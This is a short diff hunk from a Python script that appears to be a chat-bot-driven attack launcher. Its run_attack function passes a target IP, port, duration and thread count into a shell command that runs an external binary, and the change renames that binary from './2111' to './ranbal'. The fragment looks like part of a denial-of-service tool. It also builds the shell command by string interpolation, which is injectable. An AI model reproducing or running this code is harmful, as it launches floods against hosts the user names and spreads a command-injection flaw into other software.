@@ -63,7 +63,7 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     try:
         # Command with fixed parameters
-        command = f"./2111 {ip} {port} {duration} {threads}"
+        command = f"./ranbal {ip} {port} {duration} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
